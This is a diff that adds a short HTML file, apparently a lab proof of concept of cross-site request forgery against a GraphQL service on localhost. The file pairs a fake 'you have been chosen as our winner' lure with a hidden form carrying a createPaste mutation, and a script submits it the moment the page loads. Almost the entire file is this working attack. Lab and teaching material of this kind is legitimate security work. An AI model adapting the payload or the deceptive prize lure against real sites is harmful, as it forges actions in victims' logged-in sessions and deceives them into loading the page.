@@ -1,0 +1,25 @@
+<html>
+<p>This is a page that an attacker will get a victim to load and click the button below by social engineering </p>
+
+<h1> Congratulations, you have been chosen as our winner for the week </h1>
+<h3>Lask week alone, prices worth $200,000 have been claimed and our winners are loving it </h3>
+
+
+<p> It is really a form that submits a request to the graphql api </p>
+
+<form id="auto" method="post" action="http://localhost:5013/graphql">
+<input type="hidden" name="query" value="mutation { createPaste(title:&quot;Automatic-Cross-Site-Request-Forgery-Success&quot;,content:&quot;Test&quot;) { paste { id title } } }"/>
+<input type="submit" value="See your winning" style="background:none; border:none; color:blue">
+
+</form>
+
+<script>
+
+async function auto_csrf() {
+document.forms['auto'].submit();
+}
+
+auto_csrf();
+</script>
+
+</html>
